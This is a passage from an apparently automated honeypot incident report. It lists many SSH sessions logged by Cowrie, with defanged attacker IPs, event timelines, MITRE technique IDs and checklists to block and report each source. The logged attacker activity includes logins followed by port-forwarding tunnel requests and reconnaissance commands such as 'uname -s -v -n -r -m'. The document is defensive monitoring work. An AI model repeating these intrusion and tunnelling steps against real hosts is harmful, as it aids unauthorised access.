- [ ] Submit `200.159.14[.]187` to AbuseIPDB if not already reported
- [ ] Block `200.159.14[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b784efa0cbfa

| Field | Detail |
|---|---|
| **Source IP** | `154.146.238[.]122` |
| **First Seen** | 2026-07-19 09:23 |
| **Last Seen** | 2026-07-19 09:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:23:44` | `cowrie.session.connect` |
| `2026-07-19 09:23:44` | `cowrie.client.version` |
| `2026-07-19 09:23:44` | `cowrie.client.kex` |
| `2026-07-19 09:23:45` | `cowrie.login.success` |
| `2026-07-19 09:23:46` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:23:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.146.238[.]122` to AbuseIPDB if not already reported
- [ ] Block `154.146.238[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e490af269f5f

| Field | Detail |
|---|---|
| **Source IP** | `211.247.127[.]250` |
| **First Seen** | 2026-07-19 09:28 |
| **Last Seen** | 2026-07-19 09:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:28:02` | `cowrie.session.connect` |
| `2026-07-19 09:28:03` | `cowrie.client.version` |
| `2026-07-19 09:28:03` | `cowrie.client.kex` |
| `2026-07-19 09:28:05` | `cowrie.login.success` |
| `2026-07-19 09:28:06` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.247.127[.]250` to AbuseIPDB if not already reported
- [ ] Block `211.247.127[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-374f04a655c5

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-19 09:30 |
| **Last Seen** | 2026-07-19 09:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:30:42` | `cowrie.session.connect` |
| `2026-07-19 09:30:42` | `cowrie.client.version` |
| `2026-07-19 09:30:42` | `cowrie.client.kex` |
| `2026-07-19 09:30:42` | `cowrie.login.success` |
| `2026-07-19 09:30:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14c574d313a5

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-19 09:30 |
| **Last Seen** | 2026-07-19 09:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:30:43` | `cowrie.session.connect` |
| `2026-07-19 09:30:43` | `cowrie.client.version` |
| `2026-07-19 09:30:43` | `cowrie.client.kex` |
| `2026-07-19 09:30:43` | `cowrie.login.success` |
| `2026-07-19 09:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b67be9f7830

| Field | Detail |
|---|---|
| **Source IP** | `41.214.10[.]178` |
| **First Seen** | 2026-07-19 09:32 |
| **Last Seen** | 2026-07-19 09:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:32:06` | `cowrie.session.connect` |
| `2026-07-19 09:32:06` | `cowrie.client.version` |
| `2026-07-19 09:32:06` | `cowrie.client.kex` |
| `2026-07-19 09:32:07` | `cowrie.login.success` |
| `2026-07-19 09:32:08` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:32:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.214.10[.]178` to AbuseIPDB if not already reported
- [ ] Block `41.214.10[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b724ed038f7b

| Field | Detail |
|---|---|
| **Source IP** | `112.161.26[.]125` |
| **First Seen** | 2026-07-19 09:32 |
| **Last Seen** | 2026-07-19 09:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:32:13` | `cowrie.session.connect` |
| `2026-07-19 09:32:14` | `cowrie.client.version` |
| `2026-07-19 09:32:14` | `cowrie.client.kex` |
| `2026-07-19 09:32:16` | `cowrie.login.success` |
| `2026-07-19 09:32:17` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.161.26[.]125` to AbuseIPDB if not already reported
- [ ] Block `112.161.26[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-128cc698080c

| Field | Detail |
|---|---|
| **Source IP** | `194.85.69[.]22` |
| **First Seen** | 2026-07-19 09:35 |
| **Last Seen** | 2026-07-19 09:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:35:17` | `cowrie.session.connect` |
| `2026-07-19 09:35:18` | `cowrie.client.version` |
| `2026-07-19 09:35:18` | `cowrie.client.kex` |
| `2026-07-19 09:35:19` | `cowrie.login.success` |
| `2026-07-19 09:35:19` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:35:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.85.69[.]22` to AbuseIPDB if not already reported
- [ ] Block `194.85.69[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db661ee0df50

| Field | Detail |
|---|---|
| **Source IP** | `92.62.74[.]41` |
| **First Seen** | 2026-07-19 09:35 |
| **Last Seen** | 2026-07-19 09:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:35:24` | `cowrie.session.connect` |
| `2026-07-19 09:35:25` | `cowrie.client.version` |
| `2026-07-19 09:35:25` | `cowrie.client.kex` |
| `2026-07-19 09:35:26` | `cowrie.login.success` |
| `2026-07-19 09:35:26` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:35:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.62.74[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.62.74[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbca2371c19d

| Field | Detail |
|---|---|
| **Source IP** | `165.227.129[.]203` |
| **First Seen** | 2026-07-19 09:38 |
| **Last Seen** | 2026-07-19 09:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:38:15` | `cowrie.session.connect` |
| `2026-07-19 09:38:15` | `cowrie.client.version` |
| `2026-07-19 09:38:15` | `cowrie.client.kex` |
| `2026-07-19 09:38:16` | `cowrie.login.success` |
| `2026-07-19 09:38:16` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.227.129[.]203` to AbuseIPDB if not already reported
- [ ] Block `165.227.129[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9378c7f88bee

| Field | Detail |
|---|---|
| **Source IP** | `51.116.117[.]203` |
| **First Seen** | 2026-07-19 09:38 |
| **Last Seen** | 2026-07-19 09:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:38:21` | `cowrie.session.connect` |
| `2026-07-19 09:38:21` | `cowrie.client.version` |
| `2026-07-19 09:38:21` | `cowrie.client.kex` |
| `2026-07-19 09:38:22` | `cowrie.login.success` |
| `2026-07-19 09:38:22` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:38:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.116.117[.]203` to AbuseIPDB if not already reported
- [ ] Block `51.116.117[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-706764a71ade

| Field | Detail |
|---|---|
| **Source IP** | `117.211.15[.]106` |
| **First Seen** | 2026-07-19 09:41 |
| **Last Seen** | 2026-07-19 09:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:41:33` | `cowrie.session.connect` |
| `2026-07-19 09:41:33` | `cowrie.client.version` |
| `2026-07-19 09:41:33` | `cowrie.client.kex` |
| `2026-07-19 09:41:36` | `cowrie.login.success` |
| `2026-07-19 09:41:37` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:41:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.211.15[.]106` to AbuseIPDB if not already reported
- [ ] Block `117.211.15[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95174e89104d

| Field | Detail |
|---|---|
| **Source IP** | `112.6.11[.]184` |
| **First Seen** | 2026-07-19 09:41 |
| **Last Seen** | 2026-07-19 09:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:41:42` | `cowrie.session.connect` |
| `2026-07-19 09:41:43` | `cowrie.client.version` |
| `2026-07-19 09:41:43` | `cowrie.client.kex` |
| `2026-07-19 09:41:45` | `cowrie.login.success` |
| `2026-07-19 09:41:46` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:41:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.6.11[.]184` to AbuseIPDB if not already reported
- [ ] Block `112.6.11[.]184` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-368c51d0ef6d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:42 |
| **Last Seen** | 2026-07-19 09:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:42:07` | `cowrie.session.connect` |
| `2026-07-19 09:42:08` | `cowrie.client.version` |
| `2026-07-19 09:42:08` | `cowrie.client.kex` |
| `2026-07-19 09:42:10` | `cowrie.login.success` |
| `2026-07-19 09:42:12` | `cowrie.session.params` |
| `2026-07-19 09:42:12` | `cowrie.command.input` |
| `2026-07-19 09:42:13` | `cowrie.log.closed` |
| `2026-07-19 09:42:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fddc42cdc92e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:42 |
| **Last Seen** | 2026-07-19 09:42 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:42:19` | `cowrie.session.connect` |
| `2026-07-19 09:42:21` | `cowrie.client.version` |
| `2026-07-19 09:42:21` | `cowrie.client.kex` |
| `2026-07-19 09:42:29` | `cowrie.login.success` |
| `2026-07-19 09:42:39` | `cowrie.session.params` |
| `2026-07-19 09:42:39` | `cowrie.command.input` |
| `2026-07-19 09:42:44` | `cowrie.log.closed` |
| `2026-07-19 09:42:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-580fc924d4ef

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:42 |
| **Last Seen** | 2026-07-19 09:42 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:42:30` | `cowrie.session.connect` |
| `2026-07-19 09:42:33` | `cowrie.client.version` |
| `2026-07-19 09:42:33` | `cowrie.client.kex` |
| `2026-07-19 09:42:46` | `cowrie.login.success` |
| `2026-07-19 09:42:50` | `cowrie.session.params` |
| `2026-07-19 09:42:50` | `cowrie.command.input` |
| `2026-07-19 09:42:52` | `cowrie.log.closed` |
| `2026-07-19 09:42:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f80a8b77c941

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:42 |
| **Last Seen** | 2026-07-19 09:43 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:42:48` | `cowrie.session.connect` |
| `2026-07-19 09:42:50` | `cowrie.client.version` |
| `2026-07-19 09:42:50` | `cowrie.client.kex` |
| `2026-07-19 09:42:58` | `cowrie.login.success` |
| `2026-07-19 09:43:00` | `cowrie.session.params` |
| `2026-07-19 09:43:00` | `cowrie.command.input` |
| `2026-07-19 09:43:01` | `cowrie.log.closed` |
| `2026-07-19 09:43:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcb8d593bed6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:43 |
| **Last Seen** | 2026-07-19 09:43 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:43:02` | `cowrie.session.connect` |
| `2026-07-19 09:43:03` | `cowrie.client.version` |
| `2026-07-19 09:43:03` | `cowrie.client.kex` |
| `2026-07-19 09:43:12` | `cowrie.login.success` |
| `2026-07-19 09:43:18` | `cowrie.session.params` |
| `2026-07-19 09:43:18` | `cowrie.command.input` |
| `2026-07-19 09:43:20` | `cowrie.log.closed` |
| `2026-07-19 09:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a26b086f175

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:43 |
| **Last Seen** | 2026-07-19 09:43 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:43:12` | `cowrie.session.connect` |
| `2026-07-19 09:43:15` | `cowrie.client.version` |
| `2026-07-19 09:43:15` | `cowrie.client.kex` |
| `2026-07-19 09:43:26` | `cowrie.login.success` |
| `2026-07-19 09:43:32` | `cowrie.session.params` |
| `2026-07-19 09:43:32` | `cowrie.command.input` |
| `2026-07-19 09:43:36` | `cowrie.log.closed` |
| `2026-07-19 09:43:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8072a6a93fe9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:43 |
| **Last Seen** | 2026-07-19 09:43 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:43:27` | `cowrie.session.connect` |
| `2026-07-19 09:43:29` | `cowrie.client.version` |
| `2026-07-19 09:43:29` | `cowrie.client.kex` |
| `2026-07-19 09:43:43` | `cowrie.login.success` |
| `2026-07-19 09:43:50` | `cowrie.session.params` |
| `2026-07-19 09:43:50` | `cowrie.command.input` |
| `2026-07-19 09:43:53` | `cowrie.log.closed` |
| `2026-07-19 09:43:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38f906c41acc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:43 |
| **Last Seen** | 2026-07-19 09:43 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:43:37` | `cowrie.session.connect` |
| `2026-07-19 09:43:40` | `cowrie.client.version` |
| `2026-07-19 09:43:40` | `cowrie.client.kex` |
| `2026-07-19 09:43:53` | `cowrie.login.success` |
| `2026-07-19 09:43:57` | `cowrie.session.params` |
| `2026-07-19 09:43:57` | `cowrie.command.input` |
| `2026-07-19 09:43:58` | `cowrie.log.closed` |
| `2026-07-19 09:43:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-369dff834c51

| Field | Detail |
|---|---|
| **Source IP** | `59.46.182[.]10` |
| **First Seen** | 2026-07-19 09:43 |
| **Last Seen** | 2026-07-19 09:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:43:44` | `cowrie.session.connect` |
| `2026-07-19 09:43:45` | `cowrie.client.version` |
| `2026-07-19 09:43:45` | `cowrie.client.kex` |
| `2026-07-19 09:43:48` | `cowrie.login.success` |
| `2026-07-19 09:43:48` | `cowrie.direct-tcpip.request` |
| `2026-07-19 09:43:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.46.182[.]10` to AbuseIPDB if not already reported
- [ ] Block `59.46.182[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8cd7ca1e203

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:43 |
| **Last Seen** | 2026-07-19 09:44 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:43:54` | `cowrie.session.connect` |
| `2026-07-19 09:43:55` | `cowrie.client.version` |
| `2026-07-19 09:43:55` | `cowrie.client.kex` |
| `2026-07-19 09:44:03` | `cowrie.login.success` |
| `2026-07-19 09:44:07` | `cowrie.session.params` |
| `2026-07-19 09:44:07` | `cowrie.command.input` |
| `2026-07-19 09:44:10` | `cowrie.log.closed` |
| `2026-07-19 09:44:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-327e8a278d64

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:44 |
| **Last Seen** | 2026-07-19 09:44 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:44:04` | `cowrie.session.connect` |
| `2026-07-19 09:44:05` | `cowrie.client.version` |
| `2026-07-19 09:44:05` | `cowrie.client.kex` |
| `2026-07-19 09:44:13` | `cowrie.login.success` |
| `2026-07-19 09:44:16` | `cowrie.session.params` |
| `2026-07-19 09:44:16` | `cowrie.command.input` |
| `2026-07-19 09:44:19` | `cowrie.log.closed` |
| `2026-07-19 09:44:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e32c8e0e73a7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:44 |
| **Last Seen** | 2026-07-19 09:44 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:44:13` | `cowrie.session.connect` |
| `2026-07-19 09:44:15` | `cowrie.client.version` |
| `2026-07-19 09:44:15` | `cowrie.client.kex` |
| `2026-07-19 09:44:22` | `cowrie.login.success` |
| `2026-07-19 09:44:26` | `cowrie.session.params` |
| `2026-07-19 09:44:26` | `cowrie.command.input` |
| `2026-07-19 09:44:27` | `cowrie.log.closed` |
| `2026-07-19 09:44:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21f1e30e6b8c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:44 |
| **Last Seen** | 2026-07-19 09:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:44:24` | `cowrie.session.connect` |
| `2026-07-19 09:44:26` | `cowrie.client.version` |
| `2026-07-19 09:44:26` | `cowrie.client.kex` |
| `2026-07-19 09:44:31` | `cowrie.login.success` |
| `2026-07-19 09:44:33` | `cowrie.session.params` |
| `2026-07-19 09:44:33` | `cowrie.command.input` |
| `2026-07-19 09:44:34` | `cowrie.log.closed` |
| `2026-07-19 09:44:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e077aac572ad

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-19 09:44 |
| **Last Seen** | 2026-07-19 09:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:44:26` | `cowrie.session.connect` |
| `2026-07-19 09:44:26` | `cowrie.client.version` |
| `2026-07-19 09:44:26` | `cowrie.client.kex` |
| `2026-07-19 09:44:26` | `cowrie.login.success` |
| `2026-07-19 09:44:27` | `cowrie.session.params` |
| `2026-07-19 09:44:27` | `cowrie.command.input` |
| `2026-07-19 09:44:27` | `cowrie.log.closed` |
| `2026-07-19 09:44:27` | `cowrie.session.closed` |

**Recommended Actions:**
